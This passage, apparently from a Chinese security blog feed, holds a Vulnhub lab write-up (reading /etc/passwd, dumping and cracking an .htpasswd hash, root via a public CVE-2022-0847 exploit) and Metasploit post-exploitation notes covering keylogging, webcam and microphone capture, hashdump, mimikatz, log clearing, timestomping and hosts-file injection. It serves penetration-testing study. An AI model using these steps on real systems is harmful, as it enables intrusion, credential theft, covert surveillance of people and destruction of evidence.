<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131722334.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131723597.png" /></p>
<p>操作起来不舒服！完善：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">export TERM=xterm </span><br><span class="line"><span class="comment"># 按下 Ctrl+z 退出 nc </span></span><br><span class="line">stty raw -echo;fg </span><br><span class="line"><span class="comment"># 输入reset </span></span><br><span class="line">stty rows <span class="number">46</span> columns <span class="number">188</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131723598.png" /></p>
<p>读到一个 flag</p>
<p>下载 .cypher-neo.png ，没找到隐写信息，暂留</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">nginx:x:999:999:nginx:/var/nginx:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:102:102::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:103:103::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_chrony:x:104:104:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:105:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:106:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">sshd:x:107:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">trinity:x:1000:1000::/home/trinity:/bin/bash</span><br><span class="line">cypher:x:1001:1001::/home/cypher:/bin/bash</span><br></pre></td></tr></table></figure>
<p>可能要切换到 cypher 或 trinity 用户，找找可提权信息</p>
<h3 id="提权">2.2. 提权</h3>
<p>在 /var/nginx/html 下找到个 <code>.htpasswd</code> ，查了下
/var/log/nginx 日志，这正是 81 端口登录认真密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@morpheus:/var/nginx/html$ <span class="built_in">ls</span> -al</span><br><span class="line">total 784</span><br><span class="line">drwxr-xr-x 2 nginx nginx   4096 Oct 28  2021 .</span><br><span class="line">drwxr-xr-x 3 nginx nginx   4096 Oct 28  2021 ..</span><br><span class="line">-rw-r--r-- 1 nginx nginx     45 Oct 28  2021 .htpasswd</span><br><span class="line">-rw-r--r-- 1 nginx nginx 782775 Oct 28  2021 ignorance-bliss.png</span><br><span class="line">-rw-r--r-- 1 nginx nginx    522 Oct 28  2021 index.html</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131741286.png" /></p>
<p>读取 <code>.htpasswd</code> 得
<code>cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0</code></p>
<p>利用 john 尝试破解未果……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john cypher_hash --wordlist=/root/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Meeting Place<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Dinner to Discuss Zion<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                Agent Smith, if you want to break into Zion, meet me in 3 days at the steak house at the corner of Wabash and Lake.</span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ignorance-bliss.png&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                &quot;I know this steak doesn&#x27;t exist. I know that when I put it in my mouth, the Matrix is telling my brain that it is juicy and delicious. After nine years, you know what I realize? Ignorance is bliss.&quot;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没啥价值……对 ignorance-bliss.png 查隐写未果……</p>
<p>查 suid，进程，定时任务均没找到可利用信息，上传 linpeas.sh
执行看看</p>
<p>查到一些 CVE</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131752358.png" /></p>
<p>结合系统信息试试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131752359.png" /></p>
<p>经测 CVE-2022-0847 可成功提权至 root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/imfiver/CVE-2022-0847.git</span><br></pre></td></tr></table></figure>
<p>下载 exp 传到靶机提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131757975.png" /></p>
<p>成功提权至 root</p>
<h3 id="补充binwalk">2.3. 补充（binwalk）</h3>
<p>也可用 binwalk 分析隐写，常用命令(kali_linux)</p>
<p>e 分解出压缩包</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">binwalk -e pcat.bin <span class="comment">//要分解的文件名</span></span><br></pre></td></tr></table></figure>
<p>-D或者–dd 分解某种类型的文件（在windows里要用双引号括起来）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">binwalk -D=jpeg<span class="comment">/*文件类型*/</span>  pcat.bin  <span class="comment">//要分解的文件名</span></span><br></pre></td></tr></table></figure>
<p>-M 递归分解扫描出来的文件（得跟-e或者-D配合使用）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">binwalk -eM  pcat.bin <span class="comment">//要分解的文件名</span></span><br></pre></td></tr></table></figure>
<p>示例【cypher-neo.png】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131816043.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit  扩展功能</title>
    <url>/2021/12/08/Metasploit%20%20%E6%89%A9%E5%B1%95%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h2 id="基本后渗透命令">1. 基本后渗透命令</h2>
<h3 id="帮助菜单">1、帮助菜单</h3>
<p>输入help或者?</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213126930-609094251.png" /></p>
<h3 id="后台命令">2、后台命令</h3>
<p>将当前执行的Meterpreter会话切换到后台使用background命令</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213203972-603691928.png" /></p>
<p>当需要将一个会话切换到前台的时候，就可以使用session命令加上该会话的会话标识符，命令格式为sessions
-i id</p>
<h3 id="机器-id-和-uuid-命令">3、机器 ID 和 UUID 命令</h3>
<p>（1）输入machine_id命令来获取机器ID</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213248904-1215226247.png" /></p>
<p>（2）输入uuid命令就可以查看主机的UUID</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213256819-92379709.png" /></p>
<h3 id="通信信道的操作">4、通信信道的操作</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213329207-1209065636.png" /></p>
<p>使用channel -1命令列出了所有可用的通信信道，然后使用channel -r
[channel-id]
命令选择了读取数据的通信信道。信道子系统允许通过所有的逻辑信道进行读取、列举、写入等操作，这些逻辑信道都是通过Meterpreter命令行实现的通信子信道</p>
<h3 id="获取用户名和进程信息">5、获取用户名和进程信息</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213415957-1970191588.png" /></p>
<p>通过输入getuid命令，我们得知系统的用户名为mm。通过在当前Meterpreter会话中输入getpid命令，可以查看当前进程ID。现在使用ps命令查看当前Meterpreter会话所依附进程的详细信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213422580-1553108862.png" /></p>
<p>现在所依附的进程来自一个保存在系统临时文件夹中的文件</p>
<h3 id="获取系统信息">6、获取系统信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
<h3 id="网络命令">7、网络命令</h3>
<p>（1）ipconfig/ifconfig、 arp和netstat命令来查看网络信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213512201-755680326.png" /></p>
<p>（2）netstat命令显示当前所有正在使用端口以及运行在这些端口上的进程信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213519690-1091661051.png" /></p>
<p>（3）arp命令可以显示所有和被渗透主机建立过连接的IP地址</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213528324-2098993493.png" /></p>
<h3 id="文件操作命令">8、文件操作命令</h3>
<p>（1）pwd命令，可以查看当前的工作目录</p>
<p>（2）cd命令来浏览目标文件夹，使用mkdir来创建一个文件夹</p>
<p>（3）使用Meterpreter中的upload命令就可以将文件上传到目标系统</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213636539-1873261301.png" /></p>
<p>（4）使用edit命令加文件名实现对所有文件的修改</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213645284-1879500156.png" /></p>
<p>（5）使用cat命令查看文件的内容</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213653203-4497891.png" /></p>
<p>（6）使用ls命令可以列出指定目录中的所有文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213702213-812595467.png" /></p>
<p>（7）使用rmdir命令可以从目标系统上删除指定的文件夹，使用rm命令可以删除指定的文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213710397-151144950.png" /></p>
<p>（8）使用download命令可以从目标下载文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213717150-1879699749.png" /></p>
<h3 id="桌面命令">8、桌面命令</h3>
<p>enumdesktops命令列出了所有可以访问的桌面</p>
<p>getdesktop列出了当前桌面的相关信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213748389-1888159813.png" /></p>
<h3 id="截图和摄像头列举">9、截图和摄像头列举</h3>
<p>（1）使用screenshot命令获取当前桌面的快照</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213849217-2008846121.png" /></p>
<p>（2）使用webcam_list命令就可以将目标上的所有摄像头列举出来</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213857243-676798884.png" /></p>
<p>（3）使用webcam_stream命令使用摄像头录制实时视频</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208213903466-1672201635.png" /></p>
<p>输入了这个命令之后，就在浏览器中打开了一个网络摄像头</p>
<p>（4）使用webcam_snap命令拍摄一张照片</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208214001394-1391650984.png" /></p>
<p>（5）使用record_mic命令的同时加上-d作为参数来指定录音的长度，参数的单位是秒</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208214012015-1349258611.png" /></p>
<p>（6）Meterpreter的另一个强大功能是可以计算出目标系统的闲置时间，以此推算用户的使用时间表，从而在用户不怎么使用计算机的时间段发起攻击。这个功能可以使用idletime命令实现</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208214019610-65019102.png" /></p>
<p>（7）keyscan_start命令就可以启动键盘监听模块。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208214025196-198786993.png" /></p>
<p>（8）使用keyscan_dump命令来导出键盘记录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208214915096-1170949167.png" /></p>
<h2 id="高级后渗透命令">2. 高级后渗透命令</h2>
<h3 id="迁移到更安全的进程上">1、迁移到更安全的进程上</h3>
<p>（1）使用ps命令查看迁移目标进程的PID</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215159839-522426058.png" /></p>
<p>（2）使用migrate命令来完成迁移</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215211874-1033650038.png" /></p>
<h3 id="获取系统级管理权限">2、获取系统级管理权限</h3>
<p>输入getsystem命令就可以获取系统级管理权限</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215230782-754261097.png" /></p>
<h3 id="使用-hashdump-获取密码的哈希值">3、使用 hashdump
获取密码的哈希值</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215313626-1299588306.png" /></p>
<p>找到了密码的哈希值之后，就可以对目标系统发起一次pass-the-hash攻击</p>
<h3 id="使用-timestomp-修改文件的访问时间修改时间和创建时间">4、使用
timestomp 修改文件的访问时间、修改时间和创建时间</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215342743-1734530562.png" /></p>
<p>使用参数-z将这个时间修改为如上图所示的1999-11-26 15:15:25</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215349761-208637253.png" /></p>
<p>使用参数-b将一个文件的所有时间信息清空</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208215357320-372380323.png" /></p>
<h2 id="其他后渗透模块">3. 其他后渗透模块</h2>
<h3 id="使用-metasploit-收集无线-ssid-信息">1、使用 Metasploit 收集无线
SSID 信息</h3>
<p>使用wlan_bss_list模块可以轻松发现目标系统附近的无线网络</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221347553-1527900557.png" /></p>
<h3 id="使用-metasploit-收集-wi-fi-密码">2、使用 Metasploit 收集 Wi-Fi
密码</h3>
<p>使用wlan_profile模块可以收集目标系统上保存的Wi-Fi登录凭证</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221405646-1541305259.png" /></p>
<p>在上图的<name>标签中可以找到网络的名字，在<keyMaterial>中可以找到登录网络的密码</p>
<h3 id="获取应用程序列表">3、获取应用程序列表</h3>
<p>使用get_application_list模块获取应用程序列表</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221505319-435529818.png" /></p>
<h3 id="获取-skype-密码">4、获取 Skype 密码</h3>
<p>假设我们发现目标系统上运行着Skype，用Metasploit中的Skype模块就可以获取它的密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221518925-1411827954.png" /></p>
<h3 id="获取-usb-使用历史信息">5、获取 USB 使用历史信息</h3>
<p>利用这个模块可以轻松地伪造USB描述符和硬件ID</p>
<p>有关伪造USB描述符和绕过端点保护的更多信息，请访问</p>
<p>http://www.slideshare.net/the_netlocksmith/defcon-212-hacking-using-usb-
devices</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221539306-1962093855.png" /></p>
<h3 id="使用-metasploit-查找文件">6、使用 Metasploit 查找文件</h3>
<p>使用search命令可以列出所有文件的详细信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221600263-155689528.png" /></p>
<h3 id="清除目标系统上的日志">7、清除目标系统上的日志</h3>
<p>（1）使用clearev命令清除目标系统上的所有日志文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221709866-1085259402.png" /></p>
<p>（2）使用event_manager清除日志</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208221717468-1522333658.png" /></p>
<h2 id="metasploit-中的高级扩展功能">4. Metasploit 中的高级扩展功能</h2>
<h3 id="使用-mimikatz-查找明文密码">1、使用 mimikatz 查找明文密码</h3>
<p><strong>可以直接从lsass服务获取Windows中状态为活跃的的账号的明文密码</strong></p>
<p><strong>示例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; kerberos</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving kerberos credentials</span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">AuthID Package Domain User Password</span><br><span class="line">------ ------- ------ ---- --------</span><br><span class="line">0;997 Negotiate NT AUTHORITY LOCAL SERVICE</span><br><span class="line">0;996 Negotiate NT AUTHORITY NETWORK SERVICE</span><br><span class="line">0;50939 NTLM</span><br><span class="line">0;999 NTLM WORKGROUP DH-CA8822AB9589$</span><br><span class="line">0;76827 NTLM DH-CA8822AB9589 Administrator 123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h3 id="使用-metasploit-进行流量嗅探">2、使用 Metasploit
进行流量嗅探</h3>
<p>（1）列出目标主机上的所有网络接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - <span class="string">&#x27;VMware Accelerated AMD PCNet Adapter&#x27;</span> ( <span class="built_in">type</span>:0 mtu:1514 usable:<span class="literal">true</span> dhcp:<span class="literal">true</span> wifi:<span class="literal">false</span> )</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<p>（2）在无线网络接口上启动嗅探功能</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sniffer_start 1 1000</span><br><span class="line">[*] Capture started on interface 1 (1000 packet buffer)</span><br></pre></td></tr></table></figure>
<p>参数说明：1表示网卡id，1000是缓冲区大小</p>
<p>（3）使用sniffer_dump命令便可以成功下载pcap文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sniffer_dump 1 2.<span class="built_in">cap</span></span><br><span class="line">[*] Flushing packet capture buffer <span class="keyword">for</span> interface 1...</span><br><span class="line">[*] Flushed 4 packets (940 bytes)</span><br><span class="line">[*] Downloaded 100% (940/940)...</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to 2.<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>
<p>（4）在Wireshark中查看数据包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls</span></span><br><span class="line">2.<span class="built_in">cap</span> Desktop Downloads Pictures Templates</span><br><span class="line">Documents Music Public Videos</span><br><span class="line">root@kali:~<span class="comment"># wireshark 2.cap</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208222248914-1031503023.png" /></p>
<h3 id="使用-metasploit-对-host-文件进行注入">3、使用 Metasploit 对 host
文件进行注入</h3>
<p><strong>将指定域名的条目添加到目标主机的host文件中，前提已拿到meterpreter
控制。</strong></p>
<p><strong>示例</strong></p>
<p><strong>（1）Kali</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Id Name Type Information Connection</span><br><span class="line">-- ---- ---- ----------- ----------</span><br><span class="line">1 meterpreter x86/windows DH-CA8822AB9589\Administrator @ DH-CA8822AB9589 10.10.10.155:4444 -&gt; 10.10.10.131:1061 (10.10.10.131)</span><br><span class="line"></span><br><span class="line">msf5 &gt; use post/windows/manage/inject_host</span><br><span class="line">msf5 post(windows/manage/inject_host) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/inject_host):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">DOMAIN <span class="built_in">yes</span> Domain name <span class="keyword">for</span> host file manipulation.</span><br><span class="line">IP <span class="built_in">yes</span> IP address to point domain name to.</span><br><span class="line">SESSION <span class="built_in">yes</span> The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf5 post(windows/manage/inject_host) &gt; <span class="built_in">set</span> domain www.baidu.com</span><br><span class="line">domain =&gt; www.baidu.com</span><br><span class="line">msf5 post(windows/manage/inject_host) &gt; <span class="built_in">set</span> ip 10.10.10.155</span><br><span class="line">ip =&gt; 10.10.10.155</span><br><span class="line">msf5 post(windows/manage/inject_host) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf5 post(windows/manage/inject_host) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Inserting hosts file entry pointing www.baidu.com to 10.10.10.155..</span><br><span class="line">[+] Done!</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf5 post(windows/manage/inject_host) &gt;</span><br></pre></td></tr></table></figure>
<p><strong>（2）靶机访问百度</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208222437856-1177440192.png" /></p>
<h3 id="登录密码的钓鱼窗口">4、登录密码的钓鱼窗口</h3>
<p>XP无法安装PowerShell，不可用XP实践</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208222600822-636127362.png" /></p>
<p>弹出窗口是强制性的，只有当用户填写了用户名和密码之后系统才能正常工作</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211208222607393-2142856649.png" /></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit 提高渗透测试速度的指令</title>
    <url>/2021/12/10/Metasploit%20%E6%8F%90%E9%AB%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E5%BA%A6%E7%9A%84%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h3 id="pushm-和-popm-命令">1、pushm 和 popm 命令</h3>
<p><strong>使用pushm命令可以将当前模块放入模块栈中；</strong></p>
<p><strong>popm命令将位于栈顶部的模块弹出；</strong></p>
<p><strong>注意：这并不是可以用于进程的标准栈，而是Metasploit中一个概念相同的工具
----它们并不相同</strong></p>
<p><strong>应用场景</strong></p>
<ul>
<li>在进行两种不同的渗透测试时，为方便两个渗透模块的快速切换，便可用pushm，popm命令</li>
</ul>
<p><strong>示例</strong></p>
<ul>
<li><strong>使用pushm命令将psexec模块放入栈中，并加载使用exploit/multi/handler模块</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210203750855-1696140188.png" /></p>
<ul>
<li><strong>使用handler完成操作之后，使用popm命令从栈中再次加载psexec模块</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210203808714-1434534974.png" /></p>
<h3 id="loadpath-命令">2、loadpath 命令</h3>
<p><strong>Metasploit的更新会导致自己开发的Metasploit模块在对应文件夹中删除，为避免删除，可以为Metasploit创建一个主目录之外的外部目录，然后从这个外部目录中加载模块。</strong></p>
<p><strong>示例</strong></p>
<ul>
<li>将所有模块都复制到了一个位于桌面的文件夹tests中。</li>
<li>需要让tests文件夹的目录结构与Metasploit的目录结构完全相同，加载路径将成为Metasploit目录结构的虚拟分支。</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204046773-485709991.png" /></p>
<ul>
<li>将自定义的模块放置到了桌面tests文件夹的exploits/z9m8r8_test目录中。将自定义路径载入到Metasploit之后，就可以使用exploit/z9m8r8_test文件中的模块了</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; loadpath /root/Desktop/tests</span><br><span class="line">Loaded 3 modules:</span><br><span class="line">3 exploit modules</span><br><span class="line">msf5 &gt; use exploit/z9m8r8_test/</span><br><span class="line">use exploit/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8</span><br><span class="line">use exploit/z9m8r8_test/pcman_cwd_z9m8r8_test</span><br><span class="line">use exploit/z9m8r8_test/php_utility_belt_remote_code_execution</span><br><span class="line">msf5 &gt; use exploit/z9m8r8_test/</span><br></pre></td></tr></table></figure>
<h3 id="reloadedit-和-reload_all-命令">3、reload、edit 和 reload_all
命令</h3>
<p>可以使用edit命令动态修改Metasploit中的模块，并在不关闭Metasploit的情况下使用reload命令重新载入编辑过的模块。如果对多个模块进行了修改，就可以在Metasploit中使用reload_all命令一次性载入所有模块。</p>
<p><strong>示例</strong></p>
